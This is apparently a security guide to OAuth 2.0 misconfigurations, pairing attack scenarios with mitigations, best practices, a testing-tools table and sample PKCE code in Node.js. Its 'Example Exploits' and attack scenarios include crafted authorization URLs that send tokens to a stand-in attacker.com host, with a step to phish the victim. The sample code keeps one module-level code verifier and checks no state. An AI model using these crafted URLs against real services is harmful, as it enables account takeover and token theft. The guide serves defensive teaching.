# OAuth Vulnerabilities : Understanding and Exploiting Misconfigurations

OAuth is a widely-used protocol for delegated authorization, enabling third-party applications to access resources on behalf of a user. While OAuth simplifies authorization, misconfigurations or insecure implementations can expose sensitive data and allow unauthorized access.

---

## 🔑 **How OAuth Works**

OAuth has two major versions: **OAuth 1.0a** and **OAuth 2.0**. This guide focuses on **OAuth 2.0**, which is more commonly used.

### **Core Concepts of OAuth 2.0**
- **Resource Owner**: The user who owns the data.
- **Resource Server**: The server hosting the protected resources (e.g., API).
- **Client**: The third-party app requesting access to the resource server.
- **Authorization Server**: Issues tokens to the client after authenticating the resource owner.

### **OAuth 2.0 Authorization Flows**
1. **Authorization Code Flow** (Recommended for server-side apps):
   - Secure, as the client app does not directly handle user credentials.
2. **Implicit Flow** (Deprecated for new apps):
   - Tokens are directly exposed in the URL, leading to vulnerabilities.
3. **Client Credentials Flow**:
   - Used for server-to-server communication (no user interaction).
4. **Resource Owner Password Flow** (Not recommended):
   - The client handles user credentials directly, which is insecure.
5. **Device Flow**:
   - For devices with limited input (e.g., TVs or IoT).

---

## 🚩 **Common OAuth Vulnerabilities and Exploitation Techniques**

### **1. Insufficient Redirect URI Validation**
- **What it is**: OAuth servers fail to validate redirect URIs properly, allowing attackers to intercept tokens.
- **Exploitation**:
  - Register a malicious redirect URI (`https://attacker.com/callback`).
  - Trick the victim into authorizing the app, sending the token to the attacker.

#### **Attack Scenario**:
```http
https://authserver.com/authorize?response_type=code&
client_id=12345&
redirect_uri=https://attacker.com/callback&
scope=profile
```

#### **Mitigations**:
- Enforce exact URI matching (no wildcards or open redirects).
- Use state parameters to prevent tampering.

---

### **2. Missing or Weak `state` Parameter**
- **What it is**: The `state` parameter, used to prevent CSRF and redirect attacks, is missing or predictable.
- **Exploitation**:
  - Inject a malicious `state` value to hijack the flow.
  
#### **Attack Scenario**:
1. Victim initiates an OAuth flow with a legitimate app.
2. Attacker intercepts and modifies the `state` value.
3. Authorization is completed with the attacker-controlled `state`.

#### **Mitigations**:
- Always use a cryptographically random and unique `state` parameter.
- Verify the `state` value after redirection.

---

### **3. Open Redirects in OAuth Flows**
- **What it is**: A vulnerable redirect URI allows attackers to redirect users to malicious sites.
- **Exploitation**:
  - Abuse open redirects in the app or authorization server to steal tokens.

#### **Attack Scenario**:
```http
https://authserver.com/authorize?response_type=token&
client_id=12345&
redirect_uri=https://legit.com/redirect?url=https://attacker.com&
scope=profile
```

#### **Mitigations**:
- Sanitize redirect URIs and disallow user-controlled redirects.
- Reject requests with open redirect patterns.

---

### **4. Access Token Leakage in Implicit Flow**
- **What it is**: Access tokens are exposed in URLs in the implicit flow.
- **Exploitation**:
  - Capture tokens via browser history, referrer headers, or network sniffing.

#### **Attack Scenario**:
```http
https://example.com/#access_token=abcdef12345&expires_in=3600
```
- Attacker inspects browser history or intercepts tokens in transit.

#### **Mitigations**:
- Use the Authorization Code Flow with PKCE instead of the implicit flow.
- Avoid exposing tokens in URLs.

---

### **5. Token Replay Attack**
- **What it is**: An attacker reuses a stolen access token to impersonate a user.
- **Exploitation**:
  - Intercept and replay the access token to the resource server.

#### **Mitigations**:
- Implement token binding to associate tokens with specific devices or sessions.
- Use short-lived access tokens and refresh tokens.

---

### **6. Scope Manipulation**
- **What it is**: A client requests more permissions than needed, or an attacker modifies the requested scopes.
- **Exploitation**:
  - Abuse over-privileged tokens to access unauthorized resources.

#### **Mitigations**:
- Limit scopes issued to clients.
- Ensure scope values are validated and immutable during the flow.

---

### **7. CSRF in Token Requests**
- **What it is**: An attacker tricks the user into authorizing malicious requests.
- **Exploitation**:
  - Embed a crafted URL that performs an unintended action in the OAuth flow.

#### **Mitigations**:
- Validate `state` and `nonce` parameters for every request.
- Enforce CORS and same-origin policies.

---

### **8. Refresh Token Misuse**
- **What it is**: Refresh tokens, which are long-lived, can be stolen and used to generate new access tokens.
- **Exploitation**:
  - Steal refresh tokens from insecure storage.

#### **Mitigations**:
- Store refresh tokens securely (e.g., server-side or encrypted).
- Rotate refresh tokens after use.
- Use short-lived access tokens and limit refresh token lifetimes.

---

## 🛡️ **Best Practices for Securing OAuth Implementations**

1. **Secure Redirect URIs**:
   - Enforce strict URI matching (no wildcards).
   - Avoid open redirects in application URLs.

2. **Use the Right Flow**:
   - Use Authorization Code Flow with PKCE for web and mobile apps.
   - Avoid Implicit and Password flows.

3. **Validate Tokens**:
   - Verify token signatures using the public key (for JWTs).
   - Validate claims such as `iss`, `aud`, `exp`, and `scope`.

4. **Secure Token Storage**:
   - Store tokens in `HttpOnly` and `Secure` cookies.
   - Avoid storing tokens in `localStorage` or session variables accessible by JavaScript.

5. **Token Rotation and Expiry**:
   - Use short-lived access tokens.
   - Implement refresh token rotation and revocation.

6. **Enforce TLS**:
   - Always use HTTPS to encrypt token exchange and redirection.

7. **Monitor and Log**:
   - Detect anomalies in token usage (e.g., unexpected IPs or devices).
   - Implement rate-limiting to prevent brute-force attacks.

---

## 🔧 **Testing Tools for OAuth Security**

| **Tool**            | **Purpose**                                             |
|----------------------|---------------------------------------------------------|
| **Burp Suite**       | Manipulate OAuth flows, replay tokens, and inspect URIs. |
| **OWASP ZAP**        | Automated testing for OAuth vulnerabilities.             |
| **Authz**            | Analyze and exploit authorization flaws.                |
| **jwt.io**           | Decode and inspect JWTs in OAuth flows.                 |
| **Postman**          | Test API token generation and validation.               |
| **Fiddler**          | Monitor token exchanges and identify leaks.             |

---

## 🔨 **Example Exploits**

### **1. Stealing Tokens via Open Redirect**
1. Craft an open redirect URL:
   ```http
   https://authserver.com/authorize?response_type=token&
   client_id=12345&
   redirect_uri=https://example.com/redirect?url=https://attacker.com
   ```
2. Phish the victim to click the link.
3. Access token is sent to `https://attacker.com`.

### **2. Manipulating the `state` Parameter**
1. Set a predictable `state` value:
   ```http
   https://authserver.com/authorize?response_type=code&
   client_id=12345&
   state=12345&
   redirect_uri=https://example.com/callback
   ```
2. Modify the `state` value during the redirect phase.

---

## 🛠️ **Sample Code: Secure OAuth Authorization**

### **Token Generation with PKCE (Node.js)**
```javascript
const crypto = require('crypto');
const express = require('express');
const app = express();

const codeVerifier = crypto.randomBytes(32).toString('hex');
const codeChallenge = crypto.createHash('sha256').update(codeVerifier).digest('base64url');

app.get('/authorize', (req, res) => {
    const authUrl = `https://authserver.com/authorize?response_type=code&client_id=YOUR_CLIENT_ID&redirect_uri=YOUR_REDIRECT_URI&code_challenge=${codeChallenge}&code_challenge_method=S256`;
    res.redirect(authUrl);
});

app.get('/callback', async (req, res) => {
    const { code } = req.query;
    const tokenResponse = await fetch('https://authserver.com/token', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `code=${code}&client_id=YOUR_CLIENT_ID&redirect_uri=YOUR_REDIRECT_URI&code_verifier=${codeVerifier}`
    });
    const tokens = await tokenResponse.json();
    res.json(tokens);
});

app.listen(3000, () => console.log('App running on http://localhost:300

0'));
```
